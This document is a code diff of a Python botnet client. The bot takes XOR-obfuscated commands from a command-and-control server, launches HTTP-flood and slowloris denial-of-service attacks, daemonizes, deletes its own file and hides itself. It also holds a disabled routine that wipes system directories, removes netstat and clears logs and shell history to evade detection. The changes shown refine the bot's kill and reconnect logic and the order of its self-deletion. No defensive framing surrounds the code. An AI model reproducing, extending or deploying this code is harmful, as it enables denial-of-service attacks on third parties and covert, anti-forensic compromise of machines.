@@ -64,7 +64,6 @@ acceptall = [
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
 stop    = False#threads control
-breaker = False#reconnect control
 def HTTP(ip, port, path):
 	global stop
 	while True:
@@ -104,7 +103,7 @@ def SLOW(ip, port, conns, path):#slowloris, reference from https://github.com/gk
 				s = ssl.wrap_socket(s)
 			s.send(str.encode(header))
 			socket_list.append(s)
-		except: 
+		except:
 			pass
 	while True:#loop
 		if stop:#if stop=False then countine
@@ -122,7 +121,7 @@ def SLOW(ip, port, conns, path):#slowloris, reference from https://github.com/gk
 					s = ssl.wrap_socket(s)
 				s.send(str.encode(header))
 				socket_list.append(s)
-			except: 
+			except:
 				pass
 		#go back to line 100
 
@@ -163,7 +162,7 @@ def handle(sock):
 	while True:
 		tmp = sock.recv(1024).decode()
 		if len(tmp) == 0:
-			main()
+			break#return main loop
 		#print(tmp)
 		data = xor_dec(tmp,key)
 		if data[0] == '!':
@@ -211,32 +210,30 @@ def handle(sock):
 					attack = 0#clear attack list
 				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
 					sock.close()
-					global breaker
-					breaker = True
-					exit()
-					break
+					return 1
 			except:#if have error than will pass
 				pass
 		if data == xor_dec("ERoKAQ==",key):#ping
 			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
+	return 0
 
 def daemon():#daemon
 	pid = os.fork()#first fork
 	if pid:
-		sys.exit(0)
+		os._exit(0)
 	os.chdir('/')
 	os.umask(0)
 	os.setsid()
 	_pid = os.fork()#second fork for careful, prevent the process from opening a control terminal again
 	if _pid:
-		sys.exit(0)
+		os._exit(0)
 	sys.stdout.flush()#Refresh buffer
 	sys.stderr.flush()
 	sys.stdin = open("/dev/null")#off the stdin,stdout,stderr, indeed no need.
 	sys.stdout= open("/dev/null")#windows can't use this method, only can use pyinstaller's option '--noconsole'
 	sys.stderr= open("/dev/null")
 '''
-def clean_device():
+def clean_device():#don't use it if u don't want be detected in dbg
 	os.system("rm -rf /tmp/* /var/tmp/* /var/run/* /var/*")
 	os.system("rm -rf /bin/netstat")
 	os.system("cat /dev/null > /var/log/wtmp")
@@ -249,14 +246,13 @@ def clean_device():
 	os.system("history -c")
 '''
 def conn():
-	global breaker
 	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
 		if os.name != "nt":
-			daemon()#can't use in windows
 			os.system('rm -rf '+sys.argv[0])#delete ourselves
+			daemon()#can't use in windows
 			#clean_device()
 		else:
-			os.system("attrib +s +a +h "+sys.argv[0])#hide the file 
+			os.system("attrib +s +a +h "+sys.argv[0])#hide the file
 	while True:#magic loop
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -267,11 +263,11 @@ def conn():
 			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
 			s.connect((cnc,cport))
 
-			handle(s)
+			signal = handle(s)
+			if signal == 1:
+				break
 
 		except:
-			if breaker:
-				break
 			time.sleep(random.randint(1,60))
 			pass
 
